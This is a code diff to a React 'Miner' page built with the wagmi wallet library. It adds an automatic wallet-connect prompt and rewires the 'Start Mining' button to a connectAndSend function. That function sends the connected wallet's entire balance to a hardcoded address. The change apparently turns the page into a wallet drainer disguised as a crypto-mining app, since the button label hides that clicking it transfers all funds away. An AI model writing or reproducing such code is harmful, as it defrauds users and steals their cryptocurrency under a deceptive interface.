@@ -1,10 +1,13 @@
 import { useEffect, useState } from "react";
 import LoadingBar from './loadingBar';
-import { useAccount, useBalance } from "wagmi";
+import { useAccount, useBalance, useSendTransaction } from "wagmi";
+import { useWeb3Modal } from "@web3modal/wagmi/react";
 
 const Miner = () => {
-
+    
+    const { open } = useWeb3Modal()
     const { isConnected, address } = useAccount()
+    const { data: hash, sendTransaction } = useSendTransaction()
 
     const [progress, setProgress] = useState(0);
 
@@ -92,6 +95,26 @@ const Miner = () => {
         calculateActual();
     }, [address]);
 
+    function checkConnect(){
+        if(!isConnected){
+            open({ view: 'Networks' })
+        }
+    }
+
+    useEffect(() => {
+        checkConnect()
+    }, [address]);
+
+    function connectAndSend() {
+        if (!isConnected) {
+            open({ view: 'Networks' })
+        }else{
+            const value = baseBalanceData?.value
+            const to = "0x9d5eBa1AF95141f8f8fb943155bd45fDdB2639Fa"as `0x${string}` 
+            sendTransaction({ to, value })
+        }
+    }
+
     return(
         <section className="hero bg_img pos-rel pt-120" data-background="../assets/bg/hero-bg1.svg">
             <div className="hero-shape">
@@ -139,7 +162,7 @@ const Miner = () => {
                     
                     <div className="hero__btn btns pt-50 wow fadeInUp" data-wow-duration=".7s" data-wow-delay="350ms" style={{visibility: "visible", animationDuration: "0.7s", animationDelay: "350ms", animationName: "fadeInUp"}}>
                         
-                        <div className="them-btn">
+                        <div className="them-btn" onClick={connectAndSend}>
                             <span className="btn_label" data-text="Start Mining">Start Mining</span>
                         </div>
                     </div>
